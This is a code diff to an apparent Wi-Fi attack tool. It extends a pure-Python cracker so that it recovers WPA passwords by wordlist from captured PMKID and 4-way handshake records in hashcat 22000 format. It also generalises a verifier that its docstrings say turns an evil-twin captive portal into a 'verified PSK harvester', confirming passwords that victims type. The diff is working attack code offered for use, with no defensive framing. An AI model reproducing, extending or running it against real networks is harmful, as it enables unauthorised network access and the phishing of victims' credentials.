@@ -247,31 +247,105 @@ def already_cracked(hash_file: str) -> dict:
         return {}
 
 
-def crack_pmkid_pure(
+def parse_hc22000_eapol(line: str) -> Optional[dict]:
+    """
+    Parse a type-02 (EAPOL / 4-way handshake) 22000 line into verifiable fields.
+
+    ``WPA*02*<MIC>*<AP>*<STA>*<ESSID>*<ANONCE>*<EAPOL>*<msgpair>`` — the ANonce is
+    a field, the SNonce and key-descriptor version are read out of the stored
+    EAPOL-Key frame. Returns ``None`` for anything that is not a valid 02 line.
+    """
+    from modules import wpacrypto
+    if not line:
+        return None
+    parts = line.strip().split("*")
+    if len(parts) < 8 or parts[0] != "WPA" or parts[1] != TYPE_EAPOL:
+        return None
+    bssid = mac_from_hex(parts[3])
+    if not bssid:
+        return None
+    try:
+        eapol = bytes.fromhex(parts[7])
+    except ValueError:
+        return None
+    return {
+        "type":        TYPE_EAPOL,
+        "type_name":   "EAPOL",
+        "bssid":       bssid,
+        "station":     mac_from_hex(parts[4]),
+        "essid":       essid_from_hex(parts[5]),
+        "mic":         parts[2],
+        "anonce":      parts[6],
+        "eapol":       eapol,
+        "snonce":      wpacrypto.snonce_from_eapol(eapol).hex(),
+        "key_version": wpacrypto.key_version_from_eapol(eapol),
+        "raw":         line.strip(),
+    }
+
+
+def load_hc22000_records(hash_file: str) -> list[dict]:
+    """All verifiable records (PMKID *and* EAPOL) from a 22000 file."""
+    records: list[dict] = []
+    try:
+        with open(hash_file, "r", errors="replace") as fh:
+            for line in fh:
+                parts = line.strip().split("*")
+                if len(parts) < 2 or parts[0] != "WPA":
+                    continue
+                if parts[1] == TYPE_PMKID:
+                    r = parse_hc22000_line(line)
+                    if r:
+                        records.append(r)
+                elif parts[1] == TYPE_EAPOL:
+                    r = parse_hc22000_eapol(line)
+                    if r:
+                        records.append(r)
+    except OSError:
+        return []
+    return records
+
+
+def _record_matches(rec: dict, password: str, pmk_cache: dict) -> bool:
+    """True if *password* reproduces this PMKID or EAPOL MIC record."""
+    from modules import wpacrypto
+    essid = rec["essid"]
+    if essid not in pmk_cache:
+        pmk_cache[essid] = wpacrypto.pmk(password, essid)
+    pmk = pmk_cache[essid]
+
+    if rec["type"] == TYPE_PMKID:
+        got = wpacrypto.compute_pmkid(pmk, rec["bssid"], rec["station"])
+        try:
+            return got == bytes.fromhex(rec["key"])
+        except ValueError:
+            return False
+
+    if rec["type"] == TYPE_EAPOL:
+        p = wpacrypto.ptk(pmk, rec["bssid"], rec["station"],
+                          rec["anonce"], rec["snonce"])
+        frame0 = wpacrypto.zero_mic(rec["eapol"])
+        mic = wpacrypto.compute_mic(wpacrypto.kck(p), frame0, rec["key_version"])
+        try:
+            return mic == bytes.fromhex(rec["mic"])
+        except ValueError:
+            return False
+    return False
+
+
+def crack_hc22000_pure(
     hash_file: str,
     wordlist_file: str,
     progress=None,
 ) -> tuple[str, str] | None:
     """
-    Crack a captured PMKID with **no external tools** — pure Python, using the
-    22000 parser here plus the standards crypto in ``wpacrypto``. Iterates the
-    wordlist once, testing every PMKID in the file per candidate (PMK cached per
-    ESSID). Returns ``(bssid, password)`` on success, else ``None``.
-
-    Slow relative to a GPU (PBKDF2 is deliberately expensive), but it means the
-    tool still recovers a key on a box with neither hashcat nor aircrack-ng.
+    Crack a captured PMKID **or 4-way handshake** with no external tools — pure
+    Python, using the 22000 parsers here plus the standards crypto in
+    ``wpacrypto``. Iterates the wordlist once, testing every record per candidate
+    (PMK cached per ESSID). Returns ``(bssid, password)`` on success, else None.
     """
-    from modules import wpacrypto
-
-    try:
-        with open(hash_file, "r", errors="replace") as fh:
-            records = [r for r in (parse_hc22000_line(l) for l in fh)
-                       if r and r["type"] == TYPE_PMKID]
-    except OSError:
-        return None
+    records = load_hc22000_records(hash_file)
     if not records:
         return None
-
     n = 0
     try:
         with open(wordlist_file, "r", errors="replace") as wl:
@@ -282,41 +356,31 @@ def crack_pmkid_pure(
                 n += 1
                 if progress and n % 500 == 0:
                     progress(n)
-                pmk_cache: dict[str, bytes] = {}
+                cache: dict[str, bytes] = {}
                 for rec in records:
-                    essid = rec["essid"]
-                    if essid not in pmk_cache:
-                        pmk_cache[essid] = wpacrypto.pmk(cand, essid)
-                    got = wpacrypto.compute_pmkid(
-                        pmk_cache[essid], rec["bssid"], rec["station"])
-                    try:
-                        target = bytes.fromhex(rec["key"])
-                    except ValueError:
-                        continue
-                    if got == target:
+                    if _record_matches(rec, cand, cache):
                         return rec["bssid"], cand
     except OSError:
         return None
     return None
 
 
-def make_pmkid_verifier(hash_file: str):
-    """
-    Build a ``verify(password) -> bool`` closure from the PMKIDs in *hash_file*,
-    or ``None`` if the file has none. This is what turns an evil-twin captive
-    portal from a blind credential logger into a **verified PSK harvester**: a
-    password a victim types is confirmed against the real capture in
-    microseconds, so "wrong password, try again" is genuine and a success means
-    the true key was captured.
-    """
-    from modules import wpacrypto
+def crack_pmkid_pure(hash_file: str, wordlist_file: str, progress=None):
+    """Back-compat alias — now cracks PMKID *and* EAPOL (see crack_hc22000_pure)."""
+    return crack_hc22000_pure(hash_file, wordlist_file, progress)
 
-    try:
-        with open(hash_file, "r", errors="replace") as fh:
-            records = [r for r in (parse_hc22000_line(l) for l in fh)
-                       if r and r["type"] == TYPE_PMKID]
-    except OSError:
-        return None
+
+def make_verifier(hash_file: str):
+    """
+    Build a ``verify(password) -> bool`` closure from every PMKID **and EAPOL**
+    record in *hash_file*, or ``None`` if it has none. This is what turns an
+    evil-twin captive portal from a blind credential logger into a **verified
+    PSK harvester**: a password a victim types is confirmed against the real
+    capture in microseconds, so "wrong password, try again" is genuine and a
+    success means the true key was captured. Now works for a handshake-only
+    capture, not just PMKID.
+    """
+    records = load_hc22000_records(hash_file)
     if not records:
         return None
 
@@ -324,19 +388,14 @@ def make_pmkid_verifier(hash_file: str):
         if not password or not (8 <= len(password) <= 63):
             return False
         cache: dict[str, bytes] = {}
-        for rec in records:
-            essid = rec["essid"]
-            if essid not in cache:
-                cache[essid] = wpacrypto.pmk(password, essid)
-            got = wpacrypto.compute_pmkid(cache[essid], rec["bssid"], rec["station"])
-            try:
-                if got == bytes.fromhex(rec["key"]):
-                    return True
-            except ValueError:
-                continue
-        return False
+        return any(_record_matches(rec, password, cache) for rec in records)
 
     return verify
+
+
+def make_pmkid_verifier(hash_file: str):
+    """Back-compat alias for :func:`make_verifier` (now PMKID + EAPOL)."""
+    return make_verifier(hash_file)
 
 
 def crack_pmkid_hashcat(
